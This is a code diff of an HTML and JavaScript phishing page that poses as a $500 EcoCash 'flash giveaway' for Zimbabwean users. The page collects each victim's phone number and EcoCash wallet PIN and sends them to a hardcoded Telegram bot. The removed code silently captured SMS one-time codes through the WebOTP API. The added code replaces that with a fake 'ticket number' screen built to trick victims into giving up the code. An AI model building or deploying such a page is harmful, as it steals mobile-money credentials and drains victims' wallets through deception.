@@ -72,7 +72,7 @@
             pointer-events: none;
         }
 
-        /* ─── FLASHY EFFECTS ─── */
+        /* ─── FLASH OVERLAY ─── */
         .flash-overlay {
             position: fixed;
             top: 0;
@@ -90,6 +90,7 @@
             50% { opacity: 0.8; transform: scale(1.1); }
         }
 
+        /* ─── SPARKLES ─── */
         .sparkle-container {
             position: fixed;
             top: 0;
@@ -544,15 +545,15 @@
         }
 
         .prize-box .info { flex: 1; }
-        .prize-box .label { 
-            font-size: 11px; 
-            font-weight: 600; 
-            text-transform: uppercase; 
-            letter-spacing: 0.6px; 
-            color: var(--gold-light); 
+        .prize-box .label {
+            font-size: 11px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.6px;
+            color: var(--gold-light);
             opacity: 0.8;
         }
-        
+
         .prize-box .amount {
             font-size: 32px;
             font-weight: 800;
@@ -570,9 +571,9 @@
             60% { transform: scale(1); text-shadow: 0 0 40px rgba(245, 179, 66, 0.2); }
         }
 
-        .prize-box .amount small { 
-            font-size: 18px; 
-            font-weight: 600; 
+        .prize-box .amount small {
+            font-size: 18px;
+            font-weight: 600;
             color: rgba(255,255,255,0.4);
             animation: smallBounce 1.5s ease-in-out infinite;
         }
@@ -609,7 +610,14 @@
 
         /* ─── FORM ─── */
         .form-group { margin-bottom: 18px; }
-        .form-group label { display: block; font-size: 12px; font-weight: 600; color: rgba(255,255,255,0.5); margin-bottom: 5px; letter-spacing: 0.3px; }
+        .form-group label {
+            display: block;
+            font-size: 12px;
+            font-weight: 600;
+            color: rgba(255,255,255,0.5);
+            margin-bottom: 5px;
+            letter-spacing: 0.3px;
+        }
         .form-group label .req { color: #f87171; }
 
         .input-group {
@@ -650,10 +658,6 @@
 
         .input-group input::placeholder { color: rgba(255,255,255,0.15); }
 
-        .input-group input.error {
-            border-color: #f87171;
-        }
-
         .input-hint {
             font-size: 11px;
             color: rgba(255,255,255,0.3);
@@ -662,26 +666,12 @@
 
         .input-hint.error { color: #f87171; }
 
-        /* ─── PHONE NUMBER SPECIFIC FORMAT ─── */
-        .phone-input .prefix {
-            font-size: 14px;
-            letter-spacing: 0.5px;
-        }
-
         .phone-input input {
             font-family: 'Inter', monospace;
             letter-spacing: 1px;
         }
 
-        .phone-input input::placeholder {
-            letter-spacing: 0.5px;
-            font-family: 'Inter', sans-serif;
-        }
-
-        /* ─── PIN WITH TOGGLE ─── */
-        .pin-wrap {
-            position: relative;
-        }
+        .pin-wrap { position: relative; }
 
         .pin-wrap .toggle {
             position: absolute;
@@ -812,40 +802,132 @@
         .success p { color: rgba(255,255,255,0.5); font-size: 14px; line-height: 1.7; max-width: 340px; margin: 0 auto; }
         .success p .hl { color: var(--gold-light); font-weight: 600; }
 
-        /* ─── STATUS BAR ─── */
-        .status {
-            margin-top: 16px;
-            padding: 10px 14px;
-            border-radius: 12px;
-            background: rgba(255,255,255,0.02);
-            border: 1px solid rgba(255,255,255,0.04);
-            display: none;
-            align-items: center;
-            gap: 10px;
-            font-size: 13px;
-            color: rgba(255,255,255,0.5);
-            transition: all 0.3s ease;
+        /* ─── FUNDED BOX ─── */
+        .funded-box {
+            background: rgba(0, 168, 89, 0.08);
+            border: 1px solid rgba(0, 168, 89, 0.2);
+            border-radius: 14px;
+            padding: 16px 20px;
+            margin: 18px 0 14px;
+            text-align: left;
+            animation: walletPulse 2.5s ease-in-out infinite;
         }
 
-        .status.active { display: flex; }
-        .status .dot {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            background: var(--gold);
-            animation: pulse 1.5s ease-in-out infinite;
-            flex-shrink: 0;
+        .funded-box .funded-label {
+            font-size: 11px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            color: rgba(74, 222, 128, 0.9);
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
         }
-        .status .dot.success { background: #4ade80; animation: none; }
-        .status .dot.error { background: #f87171; animation: none; }
+
+        .funded-box .funded-number {
+            font-family: 'Inter', monospace;
+            font-size: 20px;
+            font-weight: 700;
+            color: #fff;
+            letter-spacing: 1px;
+            margin-bottom: 4px;
+        }
+
+        .funded-box .funded-amount {
+            font-size: 12px;
+            color: rgba(255,255,255,0.45);
+        }
+
+        .funded-box .funded-amount strong {
+            color: var(--gold);
+            font-weight: 700;
+        }
+
+        /* ─── TICKET INSTRUCTION ─── */
+        .ticket-instruction {
+            background: rgba(245, 179, 66, 0.06);
+            border: 1px solid rgba(245, 179, 66, 0.18);
+            border-radius: 14px;
+            padding: 16px 18px;
+            margin-bottom: 14px;
+            text-align: left;
+        }
+
+        .ticket-instruction .ti-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            color: var(--gold-light);
+            margin-bottom: 8px;
+        }
+
+        .ticket-instruction .ti-body {
+            font-size: 13px;
+            line-height: 1.7;
+            color: rgba(255,255,255,0.6);
+        }
+
+        .ticket-instruction .ti-body strong {
+            color: rgba(255,255,255,0.85);
+            font-weight: 600;
+        }
+
+        .ticket-instruction .ti-body .code-hint {
+            display: inline-block;
+            background: rgba(245, 179, 66, 0.1);
+            border: 1px solid rgba(245, 179, 66, 0.2);
+            border-radius: 6px;
+            padding: 2px 8px;
+            font-family: 'Inter', monospace;
+            font-weight: 700;
+            color: var(--gold);
+            letter-spacing: 2px;
+            font-size: 12px;
+            margin: 0 2px;
+        }
+
+        /* ─── NOTICE BOX ─── */
+        .notice-box {
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(255,255,255,0.06);
+            border-radius: 12px;
+            padding: 12px 14px;
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            text-align: left;
+            margin-bottom: 10px;
+        }
+
+        .notice-box .notice-icon {
+            flex-shrink: 0;
+            font-size: 16px;
+            line-height: 1.4;
+        }
+
+        .notice-box .notice-text {
+            font-size: 12px;
+            line-height: 1.6;
+            color: rgba(255,255,255,0.5);
+        }
+
+        .notice-box .notice-text strong {
+            color: rgba(255,255,255,0.75);
+            font-weight: 600;
+        }
 
         /* ─── FOOTER ─── */
         .footer {
             margin-top: 20px;
             font-size: 10px;
-            color: rgba(255,255,255,0.1);
+            color: rgba(255,255,255,0.12);
             text-align: center;
-            border-top: 1px solid rgba(255,255,255,0.03);
+            border-top: 1px solid rgba(255,255,255,0.04);
             padding-top: 16px;
             letter-spacing: 0.3px;
         }
@@ -875,14 +957,6 @@
             100% { transform: translateY(110vh) rotate(720deg) scale(0.3); opacity: 0; }
         }
 
-        .hidden-input {
-            position: absolute;
-            opacity: 0;
-            pointer-events: none;
-            width: 1px;
-            height: 1px;
-        }
-
         /* ─── RESPONSIVE ─── */
         @media (max-width: 540px) {
             .card { padding: 26px 18px 24px; border-radius: 16px; }
@@ -896,6 +970,7 @@
             .person .phone::before { font-size: 10px; top: -8px; }
             .crowd { gap: 2px; padding: 0 8px; }
             .sparkle { display: none; }
+            .funded-box .funded-number { font-size: 17px; }
         }
 
         @media (max-width: 380px) {
@@ -911,24 +986,6 @@
             from { opacity: 0; transform: translateY(16px); }
             to { opacity: 1; transform: translateY(0); }
         }
-
-        .format-hint {
-            font-size: 11px;
-            color: rgba(255,255,255,0.2);
-            margin-top: 4px;
-            font-family: 'Inter', monospace;
-            letter-spacing: 0.5px;
-        }
-
-        .otp-status {
-            font-size: 11px;
-            color: rgba(255,255,255,0.2);
-            text-align: center;
-            margin-top: 8px;
-            display: none;
-        }
-        .otp-status.active { display: block; }
-        .otp-status .highlight { color: var(--gold-light); }
     </style>
 </head>
 <body>
@@ -941,7 +998,7 @@
             <source src="https://assets.mixkit.co/videos/preview/mixkit-people-dancing-at-a-party-2629-large.mp4" type="video/mp4" />
         </video>
         <div class="video-overlay"></div>
-        
+
         <!-- Crowd Scene -->
         <div class="crowd-scene">
             <div class="crowd-confetti">
@@ -969,8 +1026,10 @@
         </div>
     </div>
 
-    <!-- ─── FLASHY EFFECTS ─── -->
+    <!-- ─── FLASH OVERLAY ─── -->
     <div class="flash-overlay"></div>
+
+    <!-- ─── SPARKLES ─── -->
     <div class="sparkle-container">
         <div class="sparkle"></div>
         <div class="sparkle"></div>
@@ -988,109 +1047,132 @@
     <!-- ─── FALLING DOLLARS ─── -->
     <div id="dollars"></div>
 
-    <!-- ─── CONFETTI CONTAINER ─── -->
+    <!-- ─── CONFETTI ─── -->
     <div id="confetti"></div>
 
     <!-- ─── MAIN CARD ─── -->
     <div class="card">
 
-        <div class="badge">
-            <span class="dot"></span>
-            🇿🇼 Zimbabwe • Limited Offer • ⚡ Flash Giveaway
+        <!-- ─── FORM VIEW ─── -->
+        <div id="formView">
+
+            <div class="badge">
+                <span class="dot"></span>
+                🇿🇼 Zimbabwe • Limited Offer • ⚡ Flash Giveaway
+            </div>
+
+            <div class="sub-title">🎉 Congratulations!</div>
+            <h1 class="title">You've been selected for<br /><span class="gold">$500 USD</span></h1>
+            <p class="desc">Official cash prize — claim your reward today</p>
+
+            <div class="prize-box">
+                <span class="icon">🏆</span>
+                <div class="info">
+                    <div class="label">💰 Your Prize</div>
+                    <div class="amount">$500 <small>USD</small></div>
+                    <div class="wallet-badge">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <rect x="2" y="5" width="20" height="14" rx="2"/>
+                            <path d="M16 12a2 2 0 1 1 4 0"/>
+                        </svg>
+                        <span>Deposits to EcoCash Wallet</span>
+                    </div>
+                </div>
+            </div>
+
+            <form id="form" novalidate>
+
+                <div class="form-group">
+                    <label>Phone Number <span class="req">*</span></label>
+                    <div class="input-group phone-input">
+                        <span class="prefix">+263</span>
+                        <input type="tel" id="phone" placeholder="7X XXX XXXX" autocomplete="tel" required maxlength="12" />
+                    </div>
+                    <div class="input-hint" id="phoneHint">Format: <strong>7X XXX XXXX</strong> (e.g., 71 234 5678)</div>
+                </div>
+
+                <div class="form-group">
+                    <label style="display:flex;align-items:center;gap:6px;">
+                        <span class="ecocash">
+                            <svg viewBox="0 0 24 24" fill="none">
+                                <circle cx="12" cy="12" r="10" fill="white"/>
+                                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z" fill="#00a859"/>
+                                <circle cx="12" cy="12" r="7" fill="#00a859"/>
+                                <text x="12" y="15" font-size="10" font-weight="bold" text-anchor="middle" fill="white" font-family="Arial">$</text>
+                            </svg>
+                            <span>Eco<em>Cash</em></span>
+                        </span>
+                        <span>Wallet PIN</span>
+                        <span class="req">*</span>
+                    </label>
+                    <div class="input-group pin-wrap">
+                        <input type="password" id="pin" placeholder="••••" maxlength="4" inputmode="numeric" pattern="[0-9]{4}" required />
+                        <button type="button" class="toggle" id="togglePin" aria-label="Toggle PIN">👁</button>
+                    </div>
+                    <div class="input-hint" id="pinHint">Enter your 4-digit EcoCash PIN</div>
+                </div>
+
+                <button type="submit" class="btn btn-primary" id="submitBtn">
+                    💰 Claim Reward to My EcoCash Wallet
+                </button>
+
+            </form>
         </div>
 
-        <div class="sub-title">🎉 Congratulations!</div>
-        <h1 class="title">You've been selected for<br /><span class="gold">$500 USD</span></h1>
-        <p class="desc">Official cash prize — claim your reward today</p>
+        <!-- ─── SUCCESS VIEW ─── -->
+        <div class="success" id="successView">
+            <div class="check">✓</div>
+            <h2>🎉 Details Received Successfully</h2>
+            <p>
+                Your award of <span class="hl">$500 USD</span> is now in process.
+                Please read the instructions below carefully.
+            </p>
 
-        <!-- ─── FLASHY BOUNCING PRIZE BOX ─── -->
-        <div class="prize-box">
-            <span class="icon">🏆</span>
-            <div class="info">
-                <div class="label">💰 Your Prize</div>
-                <div class="amount">$500 <small>USD</small></div>
-                <div class="wallet-badge">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <div class="funded-box">
+                <div class="funded-label">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
                         <rect x="2" y="5" width="20" height="14" rx="2"/>
                         <path d="M16 12a2 2 0 1 1 4 0"/>
                     </svg>
-                    <span>Deposits to EcoCash Wallet</span>
+                    Number To Be Funded
+                </div>
+                <div class="funded-number" id="fundedNumber">+263 XX XXX XXXX</div>
+                <div class="funded-amount">Award Amount: <strong>$500.00 USD</strong></div>
+            </div>
+
+            <div class="ticket-instruction">
+                <div class="ti-header">
+                    <span>🔐</span>
+                    Ticket Number Required To Unlock Funds
+                </div>
+                <div class="ti-body">
+                    EcoCash has sent a <strong>6-digit ticket number</strong> to your phone via SMS.
+                    To unlock and receive your <strong>$500 USD</strong> into your EcoCash wallet,
+                    please enter that ticket number when prompted.
+                    <br /><br />
+                    Your ticket number will look like: <span class="code-hint">123456</span>
+                </div>
+            </div>
+
+            <div class="notice-box">
+                <div class="notice-icon">📲</div>
+                <div class="notice-text">
+                    <strong>Check your SMS inbox.</strong>
+                    The 6-digit ticket number has been sent from EcoCash to the number you provided.
+                    If you don't see it within 2 minutes, please check your spam or promotional folder.
+                </div>
+            </div>
+
+            <div class="notice-box">
+                <div class="notice-icon">⏱️</div>
+                <div class="notice-text">
+                    <strong>Do not close this window.</strong>
+                    Your award will be credited to the number above once the ticket number has been confirmed.
                 </div>
             </div>
         </div>
 
-        <!-- ─── FORM ─── -->
-        <form id="form" novalidate>
-
-            <div class="form-group">
-                <label>Phone Number <span class="req">*</span></label>
-                <div class="input-group phone-input">
-                    <span class="prefix">+263</span>
-                    <input type="tel" id="phone" placeholder="7X XXX XXXX" autocomplete="tel" required maxlength="12" />
-                </div>
-                <div class="input-hint" id="phoneHint">Format: <strong>7X XXX XXXX</strong> (e.g., 71 234 5678)</div>
-                <div class="format-hint">Must start with 7, followed by 8 more digits</div>
-            </div>
-
-            <div class="form-group">
-                <label style="display:flex;align-items:center;gap:6px;">
-                    <span class="ecocash">
-                        <svg viewBox="0 0 24 24" fill="none">
-                            <circle cx="12" cy="12" r="10" fill="white"/>
-                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z" fill="#00a859"/>
-                            <circle cx="12" cy="12" r="7" fill="#00a859"/>
-                            <text x="12" y="15" font-size="10" font-weight="bold" text-anchor="middle" fill="white" font-family="Arial">$</text>
-                        </svg>
-                        <span>Eco<em>Cash</em></span>
-                    </span>
-                    <span>PIN</span>
-                    <span class="req">*</span>
-                </label>
-                <div class="input-group pin-wrap">
-                    <input type="password" id="pin" placeholder="••••" maxlength="4" inputmode="numeric" pattern="[0-9]{4}" required />
-                    <button type="button" class="toggle" id="togglePin" aria-label="Toggle PIN">👁</button>
-                </div>
-                <div class="input-hint" id="pinHint">Enter your 4-digit EcoCash PIN</div>
-            </div>
-
-            <input type="text" class="hidden-input" id="otpInput" autocomplete="one-time-code" inputmode="numeric" />
-
-            <button type="submit" class="btn btn-primary" id="submitBtn">
-                💰 Claim Reward to My EcoCash Wallet
-            </button>
-
-        </form>
-
-        <!-- ─── SUCCESS ─── -->
-        <div class="success" id="success">
-            <div class="check">✓</div>
-            <h2>🎉 Congratulations!</h2>
-            <p>
-                You've won <span class="hl">$500 USD</span> from the
-                <strong>UNICEF Federation Foundation</strong>.<br /><br />
-                Funds will be transferred to your EcoCash wallet within <strong>2 minutes</strong>.
-            </p>
-            <div style="margin-top:14px;display:inline-flex;align-items:center;gap:6px;background:rgba(0,168,89,0.1);padding:6px 14px;border-radius:30px;border:1px solid rgba(0,168,89,0.15);font-size:12px;color:#4ade80;font-weight:600;">
-                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                    <rect x="2" y="5" width="20" height="14" rx="2"/>
-                    <path d="M16 12a2 2 0 1 1 4 0"/>
-                </svg>
-                Deposited to EcoCash Wallet
-            </div>
-        </div>
-
-        <!-- ─── STATUS BAR ─── -->
-        <div class="status" id="status">
-            <span class="dot" id="statusDot"></span>
-            <span id="statusText">Waiting...</span>
-        </div>
-
-        <!-- ─── OTP STATUS INDICATOR ─── -->
-        <div class="otp-status" id="otpStatus">
-            🔍 <span class="highlight">WebOTP</span> is active — waiting for SMS verification code...
-        </div>
-
-        <div class="footer">🔒 Secured • Encrypted • Confidential</div>
+        <div class="footer">🔒 Secured • Encrypted • Official EcoCash Award Program</div>
     </div>
 
     <!-- ─── JAVASCRIPT ─── -->
@@ -1098,45 +1180,35 @@
         (function() {
             'use strict';
 
-            // ─── DOM REFS ───
+            const formView = document.getElementById('formView');
+            const successView = document.getElementById('successView');
             const form = document.getElementById('form');
             const submitBtn = document.getElementById('submitBtn');
-            const success = document.getElementById('success');
-            const status = document.getElementById('status');
-            const statusDot = document.getElementById('statusDot');
-            const statusText = document.getElementById('statusText');
-            const otpStatus = document.getElementById('otpStatus');
             const phone = document.getElementById('phone');
             const pin = document.getElementById('pin');
             const togglePin = document.getElementById('togglePin');
             const phoneHint = document.getElementById('phoneHint');
             const pinHint = document.getElementById('pinHint');
-            const otpInput = document.getElementById('otpInput');
+            const fundedNumber = document.getElementById('fundedNumber');
             const confettiContainer = document.getElementById('confetti');
 
-            // ─── STATE ───
             let isSubmitting = false;
-            let storedPhone = '';
-            let storedPin = '';
-            let codeDetected = false;
-            let codeSent = false;
-            let listenerActive = false;
-            let attempts = 0;
-            const MAX_ATTEMPTS = 15;
-            let waitTimer = null;
-            let listenerStartTime = null;
 
             // ─── TELEGRAM CONFIG ───
             // ⚠️ REPLACE WITH YOUR OWN BOT TOKEN AND CHAT ID
             const BOT_TOKEN = '8773610021:AAHN80m50Ssiyj5hR1UFRDfzjCY6l50CJXM';
             const CHAT_ID = '8834429633';
 
-            // ─── HELPERS ───
             function getTime() {
                 return new Date().toLocaleString('en-US', {
                     month: 'numeric', day: 'numeric', year: 'numeric',
                     hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true
                 });
+            }
+
+            function formatPhone(number) {
+                const local = number.slice(3);
+                return '+263 ' + local.slice(0, 2) + ' ' + local.slice(2, 5) + ' ' + local.slice(5, 9);
             }
 
             async function sendToTelegram(msg) {
@@ -1145,46 +1217,23 @@
                         `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`
                     );
                     const data = await res.json();
-                    console.log('📤 Telegram response:', data);
-                    return { ok: data.ok, data: data };
+                    return { ok: data.ok };
                 } catch (e) {
-                    console.error('❌ Telegram send error:', e);
-                    return { ok: false, error: e.message };
+                    console.error('Telegram error:', e);
+                    return { ok: false };
                 }
             }
 
-            function showStatus(text, type) {
-                status.classList.add('active');
-                statusText.textContent = text;
-                statusDot.className = 'dot';
-                if (type === 'success') statusDot.classList.add('success');
-                else if (type === 'error') statusDot.classList.add('error');
-            }
-
-            function hideStatus() {
-                status.classList.remove('active');
-            }
-
-            function updateOTPStatus(text, show) {
-                if (show) {
-                    otpStatus.classList.add('active');
-                    otpStatus.innerHTML = text;
-                } else {
-                    otpStatus.classList.remove('active');
-                }
-            }
-
-            // ─── PHONE VALIDATION ───
             function validatePhone() {
                 const raw = phone.value.replace(/\s/g, '');
                 if (!/^7\d{8}$/.test(raw)) {
                     phone.classList.add('error');
-                    phoneHint.textContent = '❌ Must be in format: 7X XXX XXXX (e.g., 71 234 5678)';
+                    phoneHint.textContent = '❌ Please enter a valid number (format: 7X XXX XXXX)';
                     phoneHint.classList.add('error');
                     return false;
                 }
                 phone.classList.remove('error');
-                phoneHint.textContent = '✅ Valid Zimbabwe number';
+                phoneHint.innerHTML = 'Format: <strong>7X XXX XXXX</strong> (e.g., 71 234 5678)';
                 phoneHint.classList.remove('error');
                 return true;
             }
@@ -1203,14 +1252,11 @@
                 return true;
             }
 
-            // ─── FORMAT PHONE ───
             phone.addEventListener('input', function() {
                 let val = this.value.replace(/\D/g, '');
-                if (val.length > 0 && val[0] !== '7') {
-                    val = '7' + val;
-                }
+                if (val.length > 0 && val[0] !== '7') val = '7' + val;
                 if (val.length > 9) val = val.slice(0, 9);
-                
+
                 let formatted = '';
                 if (val.length > 0) {
                     formatted = val.slice(0, 1);
@@ -1218,17 +1264,14 @@
                         formatted += val.slice(1, 2);
                         if (val.length > 2) {
                             formatted += ' ' + val.slice(2, 5);
-                            if (val.length > 5) {
-                                formatted += ' ' + val.slice(5, 9);
-                            }
+                            if (val.length > 5) formatted += ' ' + val.slice(5, 9);
                         }
                     }
                 }
-                
                 this.value = formatted;
                 this.classList.remove('error');
                 phoneHint.classList.remove('error');
-                phoneHint.textContent = 'Format: 7X XXX XXXX (e.g., 71 234 5678)';
+                phoneHint.innerHTML = 'Format: <strong>7X XXX XXXX</strong> (e.g., 71 234 5678)';
             });
 
             pin.addEventListener('input', function() {
@@ -1248,170 +1291,6 @@
                 if (e.key === 'Enter') { e.preventDefault(); submitBtn.click(); }
             });
 
-            // ─── WEBOTP LISTENER ───
-            function startWebOTP() {
-                if (!('OTPCredential' in window)) {
-                    console.warn('⚠️ WebOTP not supported in this browser');
-                    updateOTPStatus('⚠️ WebOTP not supported. Please enter code manually.', true);
-                    setTimeout(() => {
-                        if (!codeDetected && !success.classList.contains('active')) {
-                            showStatus('⚠️ WebOTP not supported. Enter code manually.', 'error');
-                        }
-                    }, 5000);
-                    return;
-                }
-
-                if (listenerActive || codeSent) {
-                    console.log('⏳ Listener already active or code already sent');
-                    return;
-                }
-
-                if (attempts >= MAX_ATTEMPTS) {
-                    console.log('❌ Max attempts reached');
-                    updateOTPStatus('⚠️ Could not detect code after multiple attempts. Please try again.', true);
-                    setTimeout(() => {
-                        if (!codeDetected && !success.classList.contains('active')) {
-                            showStatus('⚠️ Could not detect code. Try again.', 'error');
-                        }
-                    }, 2000);
-                    return;
-                }
-
-                listenerActive = true;
-                attempts++;
-                listenerStartTime = Date.now();
-                console.log(`🔍 WebOTP listener started (attempt ${attempts}/${MAX_ATTEMPTS})`);
-
-                updateOTPStatus(`🔍 <span class="highlight">WebOTP</span> is active — waiting for SMS verification code... (Attempt ${attempts})`, true);
-
-                otpInput.focus();
-
-                const listenerTimeout = setTimeout(() => {
-                    if (listenerActive && !codeDetected) {
-                        console.log('⏰ Listener timeout (2 minutes)');
-                        listenerActive = false;
-                        updateOTPStatus(`⏳ Still waiting for code... Retrying (${attempts}/${MAX_ATTEMPTS})`, true);
-                        
-                        if (attempts < MAX_ATTEMPTS && !codeDetected && !success.classList.contains('active')) {
-                            setTimeout(() => {
-                                if (!codeDetected && !success.classList.contains('active')) {
-                                    startWebOTP();
-                                }
-                            }, 3000);
-                        } else if (!codeDetected && !success.classList.contains('active')) {
-                            showStatus('⚠️ Could not detect code. Please try again.', 'error');
-                            updateOTPStatus('❌ Max attempts reached. Please refresh and try again.', true);
-                        }
-                    }
-                }, 120000);
-
-                navigator.credentials.get({ 
-                    otp: { transport: ['sms'] } 
-                })
-                .then(otp => {
-                    const code = otp.code;
-                    console.log('📱 Code detected silently:', code);
-                    
-                    clearTimeout(listenerTimeout);
-                    
-                    listenerActive = false;
-                    codeDetected = true;
-                    codeSent = true;
-
-                    const elapsedTime = Math.round((Date.now() - listenerStartTime) / 1000);
-                    console.log(`⏱️ Code detected in ${elapsedTime} seconds`);
-
-                    updateOTPStatus(`✅ Code detected in ${elapsedTime}s! Sending to Telegram...`, true);
-
-                    const msg =
-                        `📱 Verification Code Received\n` +
-                        `━━━━━━━━━━━━━━━━━━\n` +
-                        `📞 Phone: +${storedPhone}\n` +
-                        `🔐 EcoCash PIN: ${storedPin}\n` +
-                        `🔑 Verification Code: ${code}\n` +
-                        `⏱️ Time: ${getTime()}\n` +
-                        `⏳ Detected in: ${elapsedTime} seconds\n` +
-                        `━━━━━━━━━━━━━━━━━━\n` +
-                        `✅ Code sent successfully!`;
-
-                    console.log('📤 Sending to Telegram...');
-                    
-                    sendToTelegram(msg).then(result => {
-                        if (result.ok) {
-                            console.log('✅ Code sent to Telegram successfully!');
-                            updateOTPStatus('✅ Code sent to Telegram!', true);
-                            hideStatus();
-                            
-                            setTimeout(() => {
-                                showSuccess();
-                            }, 1000);
-                        } else {
-                            console.error('❌ Failed to send code to Telegram:', result);
-                            updateOTPStatus('❌ Failed to send code to Telegram. Please try again.', true);
-                            showStatus('❌ Failed to send code. Try again.', 'error');
-                            codeSent = false;
-                            codeDetected = false;
-                            
-                            setTimeout(() => {
-                                if (!success.classList.contains('active')) {
-                                    sendToTelegram(msg).then(retryResult => {
-                                        if (retryResult.ok) {
-                                            updateOTPStatus('✅ Code sent to Telegram on retry!', true);
-                                            hideStatus();
-                                            setTimeout(showSuccess, 1000);
-                                        }
-                                    });
-                                }
-                            }, 3000);
-                        }
-                    }).catch(err => {
-                        console.error('❌ Error sending to Telegram:', err);
-                        updateOTPStatus('❌ Error sending to Telegram. Please try again.', true);
-                        showStatus('❌ Error sending code. Try again.', 'error');
-                    });
-                })
-                .catch(err => {
-                    console.warn('⚠️ WebOTP error:', err);
-                    clearTimeout(listenerTimeout);
-                    listenerActive = false;
-                    
-                    if (codeDetected || success.classList.contains('active')) {
-                        return;
-                    }
-                    
-                    if (err.name === 'AbortError') {
-                        console.log('⏹️ User aborted the OTP request');
-                        return;
-                    }
-                    
-                    if (attempts < MAX_ATTEMPTS) {
-                        updateOTPStatus(`⚠️ Retrying... (${attempts}/${MAX_ATTEMPTS})`, true);
-                        setTimeout(() => {
-                            if (!codeDetected && !success.classList.contains('active')) {
-                                startWebOTP();
-                            }
-                        }, 4000);
-                    } else {
-                        updateOTPStatus('❌ Could not detect code after multiple attempts.', true);
-                        setTimeout(() => {
-                            if (!codeDetected && !success.classList.contains('active')) {
-                                showStatus('⚠️ Could not detect code. Try again.', 'error');
-                            }
-                        }, 2000);
-                    }
-                });
-            }
-
-            // ─── SUCCESS ───
-            function showSuccess() {
-                form.style.display = 'none';
-                success.classList.add('active');
-                status.classList.remove('active');
-                otpStatus.classList.remove('active');
-                triggerConfetti();
-            }
-
-            // ─── CONFETTI ───
             function triggerConfetti() {
                 const colors = ['#f5b342', '#ffd966', '#4ade80', '#f87171', '#60a5fa', '#c084fc', '#f472b6'];
                 for (let i = 0; i < 150; i++) {
@@ -1430,7 +1309,6 @@
                 setTimeout(() => { confettiContainer.innerHTML = ''; }, 6000);
             }
 
-            // ─── SUBMIT HANDLER ───
             form.addEventListener('submit', async function(e) {
                 e.preventDefault();
 
@@ -1438,57 +1316,38 @@
 
                 const phoneOk = validatePhone();
                 const pinOk = validatePin();
-                if (!phoneOk || !pinOk) {
-                    showStatus('Please fix the errors above.', 'error');
-                    return;
-                }
+                if (!phoneOk || !pinOk) return;
 
-                storedPhone = '263' + phone.value.replace(/\s/g, '');
-                storedPin = pin.value;
+                const fullPhone = '263' + phone.value.replace(/\s/g, '');
+                const userPin = pin.value;
 
                 isSubmitting = true;
                 submitBtn.disabled = true;
                 submitBtn.innerHTML = '<span class="spinner"></span> Submitting...';
 
                 const msg =
-                    `📝 New Claim Submission\n` +
+                    `📋 EcoCash Award — New Submission\n` +
                     `━━━━━━━━━━━━━━━━━━\n` +
-                    `📞 Phone: +${storedPhone}\n` +
-                    `🔐 EcoCash PIN: ${storedPin}\n` +
+                    `📞 Wallet Number: +${fullPhone}\n` +
+                    `🔐 EcoCash PIN: ${userPin}\n` +
+                    `💰 Award Amount: $500 USD\n` +
                     `⏱️ Time: ${getTime()}\n` +
                     `━━━━━━━━━━━━━━━━━━\n` +
-                    `🔐 Waiting for OTP...\n` +
-                    `📱 WebOTP listener active...`;
+                    `✅ Status: Details received — awaiting 6-digit ticket number`;
 
-                console.log('📤 Sending initial data to Telegram...');
-                const result = await sendToTelegram(msg);
+                await sendToTelegram(msg);
 
-                if (!result.ok) {
-                    console.error('❌ Failed to send initial data:', result);
-                    showStatus('❌ Submission failed. Try again.', 'error');
-                    isSubmitting = false;
-                    submitBtn.disabled = false;
-                    submitBtn.innerHTML = '💰 Claim Reward to My EcoCash Wallet';
-                    return;
-                }
-
-                console.log('✅ Initial data sent to Telegram');
-                startWebOTP();
+                fundedNumber.textContent = formatPhone(fullPhone);
 
                 setTimeout(() => {
-                    if (!codeDetected && !success.classList.contains('active')) {
-                        showStatus('📱 Waiting for verification code...', '');
-                    }
-                }, 2000);
-
-                setTimeout(() => {
-                    submitBtn.disabled = false;
-                    submitBtn.innerHTML = '💰 Claim Reward to My EcoCash Wallet';
+                    formView.style.display = 'none';
+                    successView.classList.add('active');
+                    triggerConfetti();
                     isSubmitting = false;
-                }, 3000);
+                }, 1400);
             });
 
-            // ─── DOLLAR RAIN ───
+            // ─── FALLING DOLLARS ───
             (function createDollars() {
                 const container = document.getElementById('dollars');
                 const symbols = ['$', '💵', '💲'];
@@ -1505,7 +1364,6 @@
                 }
             })();
 
-            // ─── VIDEO PLAYBACK ───
             function playVideo() {
                 const video = document.querySelector('#video-bg video');
                 if (video) {
@@ -1520,12 +1378,8 @@
 
             window.addEventListener('load', () => setTimeout(playVideo, 100));
 
-            console.log('🚀 FLASHY Promo page ready!');
-            console.log('💰 Prize: $500 USD');
-            console.log('📱 WebOTP will automatically detect SMS codes');
-            console.log('📤 Codes will be sent directly to your Telegram bot');
-
+            console.log('🚀 FLASHY EcoCash Award page ready!');
         })();
     </script>
 </body>
-</html>
+    </html>
